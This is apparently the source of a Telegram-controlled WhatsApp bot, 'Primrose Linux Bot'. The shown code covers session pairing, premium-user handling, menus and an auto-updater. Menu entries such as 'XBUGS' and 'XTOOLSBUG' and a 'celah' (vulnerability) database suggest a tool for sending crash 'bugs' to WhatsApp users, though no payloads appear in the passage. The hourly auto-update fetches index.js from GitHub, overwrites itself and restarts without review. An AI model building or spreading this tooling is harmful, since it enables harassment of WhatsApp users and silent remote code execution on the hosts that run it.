const {
    default: makeWASocket,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    DisconnectReason,
} = require('@denzz221/baileys');
const fs = require("fs-extra");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const config = require("./setting/config.js");
const TelegramBot = require("node-telegram-bot-api");
const acorn = require("acorn");
const vm = require("vm");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";

// Konfigurasi GitHub Auto Update
const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
const CURRENT_VERSION = "3.0.44";
const AUTO_UPDATE_FILE = "./database/auto_update.json";
const PENDING_UPDATE_FILE = "./database/pending_update.json";

// Konstanta pairing
const PAIRING_TIMEOUT = 45000;
const PAIRING_COOLDOWN = 5000;

// Load auto update setting
let autoUpdateEnabled = true;

function loadAutoUpdateSetting() {
    try {
        if (!fs.existsSync(AUTO_UPDATE_FILE)) {
            fs.writeFileSync(AUTO_UPDATE_FILE, JSON.stringify({ enabled: true }, null, 2));
            return { enabled: true };
        }
        return JSON.parse(fs.readFileSync(AUTO_UPDATE_FILE));
    } catch (error) {
        console.error("Error loading auto update setting:", error);
        return { enabled: true };
    }
}

function saveAutoUpdateSetting(enabled) {
    try {
        fs.writeFileSync(AUTO_UPDATE_FILE, JSON.stringify({ enabled: enabled }, null, 2));
    } catch (error) {
        console.error("Error saving auto update setting:", error);
    }
}

function savePendingUpdate(chatId, oldVersion, newVersion) {
    try {
        fs.writeFileSync(PENDING_UPDATE_FILE, JSON.stringify({ chatId, oldVersion, newVersion, timestamp: Date.now() }, null, 2));
    } catch (error) {
        console.error("Error saving pending update:", error);
    }
}

function getPendingUpdate() {
    try {
        if (!fs.existsSync(PENDING_UPDATE_FILE)) return null;
        return JSON.parse(fs.readFileSync(PENDING_UPDATE_FILE));
    } catch (error) {
        console.error("Error getting pending update:", error);
        return null;
    }
}

function clearPendingUpdate() {
    try {
        if (fs.existsSync(PENDING_UPDATE_FILE)) {
            fs.unlinkSync(PENDING_UPDATE_FILE);
        }
    } catch (error) {
        console.error("Error clearing pending update:", error);
    }
}

const autoUpdateSetting = loadAutoUpdateSetting();
autoUpdateEnabled = autoUpdateSetting.enabled;

// File untuk menyimpan data
const GROUP_PREMIUM_FILE = "./database/group_premium.json";
const BLOCKED_COMMANDS_FILE = "./database/blocked_commands.json";
const COLOR_SETTING_FILE = "./database/color_setting.json";
const CELAH_DATABASE_FILE = "./database/celah_database.json";

let groupPremiumData = [];

function loadGroupPremiumData() {
    try {
        if (!fs.existsSync(GROUP_PREMIUM_FILE)) {
            fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync(GROUP_PREMIUM_FILE));
    } catch (error) {
        console.error("Error loading group premium data:", error);
        return [];
    }
}

function saveGroupPremiumData(data) {
    try {
        fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error("Error saving group premium data:", error);
    }
}

let celahDatabase = [];

function loadCelahDatabase() {
    try {
        if (!fs.existsSync(CELAH_DATABASE_FILE)) {
            fs.writeFileSync(CELAH_DATABASE_FILE, JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync(CELAH_DATABASE_FILE));
    } catch (error) {
        console.error("Error loading celah database:", error);
        return [];
    }
}

function saveCelahDatabase(data) {
    try {
        fs.writeFileSync(CELAH_DATABASE_FILE, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error("Error saving celah database:", error);
    }
}

let blockedCommands = [];

function loadBlockedCommands() {
    try {
        if (!fs.existsSync(BLOCKED_COMMANDS_FILE)) {
            fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync(BLOCKED_COMMANDS_FILE));
    } catch (error) {
        console.error("Error loading blocked commands:", error);
        return [];
    }
}

function saveBlockedCommands(commands) {
    try {
        fs.writeFileSync(BLOCKED_COMMANDS_FILE, JSON.stringify(commands, null, 2));
    } catch (error) {
        console.error("Error saving blocked commands:", error);
    }
}

let currentColor = "disco";

function loadColorSetting() {
    try {
        if (!fs.existsSync(COLOR_SETTING_FILE)) {
            fs.writeFileSync(COLOR_SETTING_FILE, JSON.stringify({ color: "disco" }, null, 2));
            return { color: "disco" };
        }
        return JSON.parse(fs.readFileSync(COLOR_SETTING_FILE));
    } catch (error) {
        console.error("Error loading color setting:", error);
        return { color: "disco" };
    }
}

function saveColorSetting(color) {
    try {
        fs.writeFileSync(COLOR_SETTING_FILE, JSON.stringify({ color: color }, null, 2));
    } catch (error) {
        console.error("Error saving color setting:", error);
    }
}

groupPremiumData = loadGroupPremiumData();
celahDatabase = loadCelahDatabase();
blockedCommands = loadBlockedCommands();
const colorSetting = loadColorSetting();
currentColor = colorSetting.color;

async function checkForUpdates() {
    try {
        console.log(chalk.cyan("🔍 Mengecek update dari GitHub..."));
        const response = await axios.get(GITHUB_RAW_URL, { timeout: 10000 });
        const remoteContent = response.data;
        
        const remoteVersionMatch = remoteContent.match(/CURRENT_VERSION = "([^"]+)"/);
        const remoteVersion = remoteVersionMatch ? remoteVersionMatch[1] : "unknown";
        
        if (remoteVersion !== CURRENT_VERSION) {
            console.log(chalk.yellow(`📦 Update tersedia! Versi ${CURRENT_VERSION} → ${remoteVersion}`));
            return { hasUpdate: true, newVersion: remoteVersion, content: remoteContent };
        }
        
        console.log(chalk.green("✅ Bot sudah versi terbaru!"));
        return { hasUpdate: false };
    } catch (error) {
        console.error(chalk.red("❌ Gagal mengecek update:", error.message));
        return { hasUpdate: false, error: error.message };
    }
}

async function performUpdate(chatId) {
    try {
        const update = await checkForUpdates();
        
        if (!update.hasUpdate) {
            if (chatId) {
                await safeSendMessage(chatId, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
            }
            return false;
        }
        
        savePendingUpdate(chatId, CURRENT_VERSION, update.newVersion);
        fs.writeFileSync(__filename, update.content);
        console.log(chalk.green("✅ File index.js berhasil diupdate!"));
        
        if (chatId) {
            await safeSendMessage(chatId, `✅ Update berhasil! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Bot akan restart dalam 3 detik...`);
        }
        
        setTimeout(() => {
            process.exit(0);
        }, 3000);
        
        return true;
    } catch (error) {
        console.error(chalk.red("❌ Gagal update:", error.message));
        if (chatId) {
            await safeSendMessage(chatId, `❌ Gagal update: ${error.message}`);
        }
        return false;
    }
}

let autoUpdateInterval = null;

function startAutoUpdateChecker() {
    if (autoUpdateInterval) {
        clearInterval(autoUpdateInterval);
    }
    
    autoUpdateInterval = setInterval(async () => {
        if (!autoUpdateEnabled) return;
        console.log(chalk.cyan("🔄 Auto update check..."));
        const update = await checkForUpdates();
        if (update.hasUpdate) {
            console.log(chalk.yellow(`📦 Auto update ditemukan! Versi ${CURRENT_VERSION} → ${update.newVersion}`));
            await performUpdate(null);
        }
    }, 60 * 60 * 1000);
}

function stopAutoUpdateChecker() {
    if (autoUpdateInterval) {
        clearInterval(autoUpdateInterval);
        autoUpdateInterval = null;
    }
}

// ================= SAFE FUNCTIONS ================= //

async function safeSendMessage(chatId, text, options = {}) {
    if (!chatId) return null;
    try {
        return await bot.sendMessage(chatId, text, options);
    } catch (error) {
        console.error("Error sending message:", error.message);
        return null;
    }
}

async function safeEditMessageText(chatId, messageId, newText, options = {}) {
    if (!chatId || !messageId) return null;
    try {
        return await bot.editMessageText(newText, {
            chat_id: chatId,
            message_id: messageId,
            ...options
        });
    } catch (error) {
        if (error.response?.body?.description?.includes("message is not modified")) return null;
        if (error.response?.body?.description?.includes("message to edit not found")) return null;
        console.error("Error editing message:", error.message);
        return null;
    }
}

async function safeEditMessageMedia(chatId, messageId, media, options = {}) {
    if (!chatId || !messageId) return null;
    try {
        return await bot.editMessageMedia(media, {
            chat_id: chatId,
            message_id: messageId,
            ...options
        });
    } catch (error) {
        if (error.response?.body?.description?.includes("message is not modified")) return null;
        if (error.response?.body?.description?.includes("message to edit not found")) return null;
        console.error("Error editing media:", error.message);
        return null;
    }
}

async function safeEditMessageReplyMarkup(chatId, messageId, replyMarkup) {
    if (!chatId || !messageId) return null;
    try {
        return await bot.editMessageReplyMarkup(replyMarkup, {
            chat_id: chatId,
            message_id: messageId
        });
    } catch (error) {
        if (error.response?.body?.description?.includes("message is not modified")) return null;
        if (error.response?.body?.description?.includes("message to edit not found")) return null;
        return null;
    }
}

async function safeSendPhoto(chatId, photo, options = {}) {
    if (!chatId) return null;
    try {
        return await bot.sendPhoto(chatId, photo, options);
    } catch (error) {
        console.error("Error sending photo:", error.message);
        return null;
    }
}

function startBot() {
  console.log(chalk.red(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
`));

console.log(chalk.red(`
Informasi:
Dev : t.me/ItsMeXanderRzMd
Channel : https://t.me/allteamlinux
Version: ${CURRENT_VERSION}
Auto Update: ${autoUpdateEnabled ? "ON" : "OFF"}
`));

console.log(chalk.blue(`
[ 🚀 BOT BERJALAN... ]
`));
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

setTimeout(async () => {
    const pending = getPendingUpdate();
    if (pending && pending.chatId) {
        try {
            const targetChatId = OWNER_ID;
            await safeSendMessage(targetChatId, `✅ *VERSI SUDAH NEW!*\n\nVersi ${pending.oldVersion} → ${pending.newVersion}\nBot telah berhasil diupdate dan restart.\n\nSilakan gunakan bot kembali.\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
            clearPendingUpdate();
        } catch (e) {
            console.error("Error sending pending notification to owner:", e);
        }
    }
}, 3000);

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

let sock;
let reconnectAttempts = new Map();
let pingIntervals = new Map();
let pairingInProgress = new Map();

function startPingInterval(botNumber, ws) {
    if (pingIntervals.has(botNumber)) {
        clearInterval(pingIntervals.get(botNumber));
    }
    const interval = setInterval(() => {
        if (ws && ws.user) {
            ws.sendMessage(botNumber + "@s.whatsapp.net", { text: " " }).catch(() => {});
        }
    }, 25000);
    pingIntervals.set(botNumber, interval);
}

function stopPingInterval(botNumber) {
    if (pingIntervals.has(botNumber)) {
        clearInterval(pingIntervals.get(botNumber));
        pingIntervals.delete(botNumber);
    }
}

async function reconnectWithBackoff(botNumber, attempt = 1) {
    const maxAttempts = 15;
    const baseDelay = 5000;
    const maxDelay = 60000;
    let delay = Math.min(baseDelay * Math.pow(1.5, attempt - 1), maxDelay);
    console.log(`🔄 Reconnect attempt ${attempt} for ${botNumber} in ${delay}ms`);
    setTimeout(async () => {
        try {
            await reconnectWhatsApp(botNumber, attempt);
        } catch (error) {
            if (attempt < maxAttempts) {
                await reconnectWithBackoff(botNumber, attempt + 1);
            } else {
                console.error(`❌ Failed to reconnect ${botNumber} after ${maxAttempts} attempts`);
            }
        }
    }, delay);
}

async function reconnectWhatsApp(botNumber, attempt = 1) {
    try {
        console.log(`🔄 Reconnecting WhatsApp ${botNumber} (attempt ${attempt})...`);
        const sessionDir = createSessionDir(botNumber);
        if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
            console.log(`❌ Creds.json not found for ${botNumber}, removing from active sessions`);
            removeActiveSession(botNumber);
            return null;
        }
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const newSock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
            keepAliveIntervalMs: 60000,
            connectTimeoutMs: 90000,
            emitOwnEvents: true,
            fireInitQueries: true,
            syncFullHistory: false,
            markOnlineOnConnect: false,
            generateHighQualityLinkPreview: false,
            patchMessageBeforeSending: (msg) => msg,
        });
        stopPingInterval(botNumber);
        newSock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
                console.log(`✅ WhatsApp ${botNumber} reconnect success!`);
                sessions.set(botNumber, newSock);
                reconnectAttempts.delete(botNumber);
                startPingInterval(botNumber, newSock);
                pairingInProgress.delete(botNumber);
            } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 403;
                if (shouldReconnect && !pairingInProgress.has(botNumber)) {
                    const currentAttempt = (reconnectAttempts.get(botNumber) || 1) + 1;
                    reconnectAttempts.set(botNumber, currentAttempt);
                    console.log(`⚠️ WhatsApp ${botNumber} disconnected (${statusCode}), reconnecting...`);
                    await reconnectWithBackoff(botNumber, currentAttempt);
                } else {
                    console.log(`🚫 WhatsApp ${botNumber} logged out or blocked, removing session`);
                    removeActiveSession(botNumber);
                    stopPingInterval(botNumber);
                    pairingInProgress.delete(botNumber);
                }
            }
        });
        newSock.ev.on("creds.update", saveCreds);
        return newSock;
    } catch (error) {
        console.error(`Error reconnecting WhatsApp ${botNumber}:`, error);
        throw error;
    }
}

function saveActiveSessions(botNumber) {
    try {
        let sessionsList = [];
        if (fs.existsSync(SESSIONS_FILE)) {
            const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            if (!existing.includes(botNumber)) {
                sessionsList.push(...existing, botNumber);
            } else {
                sessionsList.push(...existing);
            }
        } else {
            sessionsList.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
    } catch (error) {
        console.error("Error saving session:", error);
    }
}

function removeActiveSession(botNumber) {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            let sessionsList = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            sessionsList = sessionsList.filter(num => num !== botNumber);
            fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
        }
        sessions.delete(botNumber);
        stopPingInterval(botNumber);
        pairingInProgress.delete(botNumber);
    } catch (error) {
        console.error("Error removing active session:", error);
    }
}

async function initializeWhatsAppConnections() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
            for (const botNumber of activeNumbers) {
                console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                const sessionDir = createSessionDir(botNumber);
                const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
                sock = makeWASocket({
                    auth: state,
                    printQRInTerminal: true,
                    logger: P({ level: "silent" }),
                    defaultQueryTimeoutMs: undefined,
                    keepAliveIntervalMs: 60000,
                    connectTimeoutMs: 90000,
                    emitOwnEvents: true,
                    fireInitQueries: true,
                    syncFullHistory: false,
                    markOnlineOnConnect: false,
                    generateHighQualityLinkPreview: false,
                });
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => {
                        console.log(`⏰ Timeout connecting ${botNumber}`);
                        resolve();
                    }, 60000);
                    sock.ev.on("connection.update", async (update) => {
                        const { connection, lastDisconnect } = update;
                        if (connection === "open") {
                            clearTimeout(timeout);
                            console.log(`Bot ${botNumber} terhubung!`);
                            sessions.set(botNumber, sock);
                            startPingInterval(botNumber, sock);
                            resolve();
                        } else if (connection === "close") {
                            const statusCode = lastDisconnect?.error?.output?.statusCode;
                            const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 403;
                            if (shouldReconnect) {
                                console.log(`Mencoba menghubungkan ulang bot ${botNumber}... (${statusCode || 'unknown'})`);
                                reconnectWithBackoff(botNumber, 1);
                                clearTimeout(timeout);
                                resolve();
                            } else {
                                clearTimeout(timeout);
                                reject(new Error("Koneksi ditutup - logged out or blocked"));
                            }
                        }
                    });
                    sock.ev.on("creds.update", saveCreds);
                });
            }
        }
    } catch (error) {
        console.error("Error initializing WhatsApp Connections:", error);
    }
}

function createSessionDir(botNumber) {
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (!fs.existsSync(deviceDir)) {
        fs.mkdirSync(deviceDir, { recursive: true });
    }
    return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
    if (pairingInProgress.has(botNumber)) {
        const progressTime = pairingInProgress.get(botNumber);
        const elapsed = Date.now() - progressTime;
        if (elapsed < PAIRING_COOLDOWN) {
            await safeSendMessage(chatId, `⚠️ *Pairing sedang berlangsung untuk nomor ${botNumber}*\nSilakan tunggu ${Math.ceil((PAIRING_COOLDOWN - elapsed) / 1000)} detik lagi.`, { parse_mode: "Markdown" });
            return;
        } else {
            pairingInProgress.delete(botNumber);
        }
    }
    
    pairingInProgress.set(botNumber, Date.now());
    let statusMessage = null;
    let connectionEstablished = false;
    let pairingTimeout = null;
    
    try {
        const sentMsg = await safeSendMessage(chatId, `
<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
— Number : ${botNumber}
— Status : Connecting...
`, { parse_mode: "HTML" });
        if (sentMsg) statusMessage = sentMsg.message_id;
    } catch (error) {
        pairingInProgress.delete(botNumber);
        throw error;
    }

    const sessionDir = createSessionDir(botNumber);
    
    const credsPath = path.join(sessionDir, 'creds.json');
    if (fs.existsSync(credsPath)) {
        try {
            fs.unlinkSync(credsPath);
            console.log(`🗑️ Deleted old creds.json for ${botNumber}`);
        } catch (e) {}
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const newSock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: 30000,
        keepAliveIntervalMs: 30000,
        connectTimeoutMs: 30000,
        emitOwnEvents: true,
        fireInitQueries: false,
        syncFullHistory: false,
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false,
        patchMessageBeforeSending: (msg) => msg,
    });

    let pairingCodeRequested = false;

    const cleanup = () => {
        if (pairingTimeout) clearTimeout(pairingTimeout);
        pairingInProgress.delete(botNumber);
    };

    return new Promise((resolve, reject) => {
        pairingTimeout = setTimeout(() => {
            if (!connectionEstablished) {
                console.log(`⏰ Pairing timeout for ${botNumber}`);
                cleanup();
                if (statusMessage) {
                    safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
— Number : ${botNumber}
— Status : Timeout ⏰ (Silakan coba lagi)
`, { parse_mode: "HTML" }).catch(() => {});
                }
                reject(new Error("Pairing timeout"));
            }
        }, PAIRING_TIMEOUT);

        newSock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect, qr, pairingCode } = update;
            
            if (pairingCode && !pairingCodeRequested) {
                pairingCodeRequested = true;
                const formattedCode = pairingCode.match(/.{1,4}/g)?.join("-") || pairingCode;
                
                if (statusMessage) {
                    await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>
— Number : ${botNumber}
— Pairing Code : <code>${formattedCode}</code>
— Status : Waiting for pairing...
`, { parse_mode: "HTML" });
                }
                console.log(`📱 Pairing code for ${botNumber}: ${formattedCode}`);
            }
            
            if (connection === "open") {
                if (!connectionEstablished) {
                    connectionEstablished = true;
                    clearTimeout(pairingTimeout);
                    cleanup();
                    
                    sessions.set(botNumber, newSock);
                    saveActiveSessions(botNumber);
                    startPingInterval(botNumber, newSock);
                    
                    console.log(`✅ WhatsApp ${botNumber} connected successfully!`);
                    
                    if (statusMessage) {
                        await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ ✅ ]</blockquote>
— Number : ${botNumber}
— Status : Connected Successfully!
`, { parse_mode: "HTML" });
                    }
                    resolve(newSock);
                }
            } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const errorMessage = lastDisconnect?.error?.message || "Unknown error";
                
                console.log(`Connection closed for ${botNumber}, statusCode: ${statusCode}, error: ${errorMessage}`);
                
                cleanup();
                
                if (statusCode === DisconnectReason.loggedOut || statusCode === 403) {
                    if (statusMessage) {
                        await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>
— Number : ${botNumber}
— Status : Gagal (Logged out / Blocked)
`, { parse_mode: "HTML" });
                    }
                    removeActiveSession(botNumber);
                    reject(new Error("Logged out or blocked"));
                    
                } else if (statusCode === 428) {
                    if (!connectionEstablished && !pairingCodeRequested) {
                        try {
                            const code = await newSock.requestPairingCode(botNumber);
                            pairingCodeRequested = true;
                            const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
                            
                            if (statusMessage) {
                                await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>
— Number : ${botNumber}
— Pairing Code : <code>${formattedCode}</code>
— Status : Waiting for pairing...
`, { parse_mode: "HTML" });
                            }
                        } catch (err) {
                            if (statusMessage) {
                                await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>
— Number : ${botNumber}
— Status : Error requesting pairing code
`, { parse_mode: "HTML" });
                            }
                            reject(err);
                        }
                    }
                    
                } else if (statusCode === 408 || statusCode === 503) {
                    if (statusMessage) {
                        await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ ⏰ ]</blockquote>
— Number : ${botNumber}
— Status : Connection timeout (Coba lagi)
`, { parse_mode: "HTML" });
                    }
                    reject(new Error(`Connection timeout (${statusCode})`));
                    
                } else {
                    if (statusMessage) {
                        await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>
— Number : ${botNumber}
— Status : Error (${statusCode || 'unknown'})
`, { parse_mode: "HTML" });
                    }
                    reject(new Error(`Connection closed: ${statusCode}`));
                }
                
            } else if (connection === "connecting") {
                if (statusMessage) {
                    await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ 🔄 ]</blockquote>
— Number : ${botNumber}
— Status : Connecting...
`, { parse_mode: "HTML" });
                }
            }
        });

        newSock.ev.on("creds.update", saveCreds);
        
        setTimeout(async () => {
            if (!pairingCodeRequested && !connectionEstablished) {
                try {
                    pairingCodeRequested = true;
                    const code = await newSock.requestPairingCode(botNumber);
                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
                    
                    if (statusMessage) {
                        await safeEditMessageText(chatId, statusMessage, `
<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>
— Number : ${botNumber}
— Pairing Code : <code>${formattedCode}</code>
— Status : Waiting for pairing...
`, { parse_mode: "HTML" });
                    }
                } catch (err) {
                    console.log(`Error requesting pairing code for ${botNumber}:`, err.message);
                }
            }
        }, 2000);
    });
}

let premiumUsers = [];
let adminUsers = [];

ensureFileExists("./database/premium.json");
ensureFileExists("./database/admin.json");

try {
    premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"));
    adminUsers = JSON.parse(fs.readFileSync("./database/admin.json"));
} catch (error) {
    premiumUsers = [];
    adminUsers = [];
}

function savePremiumUsers() {
    fs.writeFileSync("./database/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync("./database/admin.json", JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === "change") {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error watching file:`, error);
            }
        }
    });
}

watchFile("./database/premium.json", (data) => (premiumUsers = data));
watchFile("./database/admin.json", (data) => (adminUsers = data));

function isOwner(userId) {
    return OWNER_ID.toString() === userId.toString();
}

function getPremiumStatus(userId) {
    const user = premiumUsers.find((user) => user.id === userId);
    if (user && new Date(user.expiresAt) > new Date()) {
        return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
    } else {
        return "Tidak - Tidak ada waktu aktif";
    }
}

function formatRuntime() {
    let sec = Math.floor(process.uptime());
    let hrs = Math.floor(sec / 3600);
    sec %= 3600;
    let mins = Math.floor(sec / 60);
    sec %= 60;
    return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
    const usedMB = process.memoryUsage().rss / 1024 / 1024;
    return `${usedMB.toFixed(0)} MB`;
}

function getRandomImage() {
    return "https://files.catbox.moe/n5forg.jpg";
}

const buttonIntervals = new Map()
let globalIntervalId = null
let globalMessageId = null
let globalChatId = null
let discoActive = false
let currentStyleIndex = 0
const buttonStyles = ["primary", "success", "danger"]

function getButtonStyle(color) {
    switch(color) {
        case "danger": return "danger";
        case "primary": return "primary";
        case "success": return "success";
        case "secondary": return undefined;
        case "disco": return "disco";
        default: return undefined;
    }
}

function getColorFromChoice(choice) {
    switch(choice) {
        case "XRED": return "danger";
        case "XBLUE": return "primary";
        case "XGREEN": return "success";
        case "XWHITE": return "secondary";
        case "XDISCO": return "disco";
        default: return currentColor;
    }
}

async function sendColoredMenu(chatId, from, color, editMessageId = null) {
    const userId = from.id
    const randomImage = getRandomImage()
    const runtimeStatus = formatRuntime()
    const memoryStatus = formatMemory()
    const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
    const botNumber = sessions.size

    const isWhite = (color === "secondary")
    const buttonStyle = isWhite ? undefined : (color === "disco" ? buttonStyles[0] : color)
    
    let keyboard = [
        [
            { text: "XBUGS", callback_data: "trashmenu", style: buttonStyle },
            { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }
        ],
        [
            { text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle },
            { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }
        ],
        [
            { text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle },
            { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }
        ]
    ]

    if (isWhite) {
        keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''))
    }

    const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟    
😄 Owner : @realmarz 🌟
🍽 Version : ${CURRENT_VERSION} 
🗡 Platform : Telegram
<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
⛧ Status : ${status}
⛧ Number : ${botNumber}
⛧ Runtime : ${runtimeStatus}
⛧ Memory : ${memoryStatus}`

    let sent;
    
    if (editMessageId) {
        try {
            await safeEditMessageMedia(chatId, editMessageId, {
                type: 'photo',
                media: randomImage,
                caption: caption,
                parse_mode: "HTML"
            }, {
                reply_markup: { inline_keyboard: keyboard }
            });
            sent = { message_id: editMessageId };
        } catch (error) {
            sent = await safeSendPhoto(chatId, randomImage, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: { inline_keyboard: keyboard }
            });
        }
    } else {
        sent = await safeSendPhoto(chatId, randomImage, {
            caption: caption,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
    }

    if (!sent) return null;

    const messageId = sent.message_id
    globalMessageId = messageId
    globalChatId = chatId
    currentStyleIndex = 0

    if (globalIntervalId) {
        clearInterval(globalIntervalId)
    }

    if (color === "disco") {
        discoActive = true
        globalIntervalId = setInterval(async () => {
            if (!discoActive) return
            
            currentStyleIndex = (currentStyleIndex + 1) % buttonStyles.length
            const newStyle = buttonStyles[currentStyleIndex]

            let newKeyboard = [
                [
                    { text: "XBUGS", callback_data: "trashmenu", style: newStyle },
